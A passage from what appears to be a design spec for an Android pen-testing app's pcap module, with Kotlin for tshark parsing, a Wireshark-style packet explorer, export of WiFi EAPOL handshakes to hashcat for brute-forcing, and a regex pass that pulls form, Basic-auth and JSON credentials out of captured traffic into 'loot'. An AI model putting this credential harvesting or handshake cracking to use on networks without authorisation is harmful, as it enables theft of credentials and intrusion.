        bridge.preFlight(tshark).orThrow()
        val caps = bridge.exec(tshark, "tshark", "-r", path(file), "-T", "fields",
            "-e", "frame.number", "-e", "frame.time_epoch", "-e", "_ws.col.Protocol",
            "-e", "ip.src", "-e", "ip.dst", "-e", "frame.len", "-e", "tcp.stream",
            "-E", "separator=|").stdout.parseFrameFields()
        val meta = bridge.exec(tshark, "tshark", "-r", path(file), "-T", "json",
            "--no-duplicate-keys", "-c", "1").stdout.jsonHeaderPeek()
        PcapSession(fileRef = path(file), packetCount = caps.size,
            protocolsSummary = caps.protocolHistogram(), firstTs = caps.firstTs())   // → PcapSession row
    }

    /** Full dissection tree for ONE packet — on demand, not for the whole file. */
    suspend fun dissectPacket(file: String, frameNo: Int): DissectionTree =
        bridge.exec(tshark, "tshark", "-r", file, "-Y", "frame.number==$frameNo",
            "-T", "json", "--no-duplicate-keys").stdout.parseDissectionTree()

    /** EAPOL handshake export → cracker handoff (the killer feature): -m 22000 ready. */
    suspend fun exportHandshakes(file: String, out: String) {
        bridge.exec(tshark, "tshark", "-r", file, "-Y", "eapol.keydes_type", ...).expectExit(0)
        bridge.exec(Tool("hcx"), "hcxpcapngtool", file, "-o", out).expectExit(0)
        Loot.store(WifiAudit.toHandshakeLoot(out))        // → brute-force deep-link armed
    }
}
```

**Display-filter bar (Kotlin grammar, not a shell-out):** a `FilterGrammar` parse-tree compiler — supports the common Wireshark subset (`ip.addr`, `tcp.port`, `http.method`, `eapol`, boolean ops) → compiled to a `-Y` expression passed to tshark for full-file loads AND evaluated client-side over loaded rows for snappy refinement. Syntax-highlighted input with error-underline on bad parses.

### 3.2 Packet explorer — three-pane, the Wireshark feel

```kotlin
// dashboards/pcap/PacketExplorerWidget.kt  (widgetId "pcap.packet.explorer", full-registry ID ✅)
@Composable
fun PacketExplorerWidget(vm: PcapViewModel = hiltViewModel()) {
    WidgetShell(widgetId = "pcap.packet.explorer", title = "Packet Explorer", ...) {
        val selected by vm.selectedFrame.collectAsStateWithLifecycle()
        Column {
            FilterBar(vm.filter, vm::applyFilter)                    // grammar bar + auto-complete chips
            Row(Modifier.weight(1f)) {
                PacketList(vm.frames) { vm.select(it) }               // virtualized mono table (reuse streaming-text family)
                DissectionTreePane(vm.dissectionTree) { node ->      // expandable protocol tree
                    vm.highlightBytes(node)
                }
                HexDumpPane(vm.frame, vm.highlightRange)             // byte-linked hex/ASCII pane
            }
        }
    }
}
```

**Follow-stream view** (`pcap.stream.reassembly`): reassembled TCP/UDP payload — mono text + hex toggle, export payload-as-file; **hex pane follows dissection-tree clicks** (the interaction that makes Wireshark Wireshark).

### 3.3 Credential-grep + camtraffic presets (the pen-test views)

```kotlin
// pcap/CredGrep.kt — regex pass over stream payloads, hits → Loot promotion
object CredGrep {
    val PATTERNS = listOf(
        "user.*?(?::|=)\\s*['\"]?([^&\\s'\"$]{3,})" to "FORM",
        "Authorization:\\s*Basic\\s+([A-Za-z0-9+/=]{8,})".to B64("BASIC"),
        "cred[^\"]*\"[^\"]*\"" to "JSON", ...)

    fun grep(streams: List<PcapStream>): List<CredHit> = streams.flatMap { s ->
        PATTERNS.mapNotNull { (rx, kind) -> rx.findAll(s.reassembled).map { m ->
            CredHit(s.endpoints, kind, m.value.snippet)  } }.flatten()
    }.also { hits -> hits.forEach { loot.store(it.asLoot()) } }      // → Secrets exposure prompt: promote to BrowserCredential/workspace manually
}
```

Plus a **camtraffic profile chip** in the FilterBar ("Cameras": `rtsp || onvif || http contains "Server: IpCamera"` presets) — deep-links findings to the cam-sweep Target flow.

SAF file picker (`.pcap`/`.pcapng`) + **live capture entry point** (device listener via tcpdump root-run, gated pre-flight GREY without root — live capture itself is Sprint 8's tshark-live polish; v1 ships the analysis surface fully). Every session added to `pcap.session.list` — columnar browser with protocol chips, tags, packet counts.

**Tests:** fixture pcapWalk (`http.cap` from Wireshark's samples — replaced with our canned HTTP + EAPOL + SIP fixture) — parse/field counts match golden; dissection-tree render for a known frame; filter-grammar parser matches tshark truth on 20 golden expressions; EAPOL export → hashcat-profile deep-link armed round-trip; credgrep fixtures (basic-auth + form). **Settings:** `pcap.live_capture_use` (training-safe mode), `pcap.autogrep_on_import` (default ON), `pcap.max_file_mb` (memory guard — huge pcaps paged by follow-stream). **Tooltips:** `pcap.session.list`, `pcap.packet.explorer`, `pcap.stream.reassembly`, `pcap.credgrep` — the Wireshark-familiarity teaching entries. **Walkthrough:** hands-on — import the bundled fixture capture, click an HTTP packet, watch the hex byte highlight follow (`advanceOn: pcap.tree.clicked`).
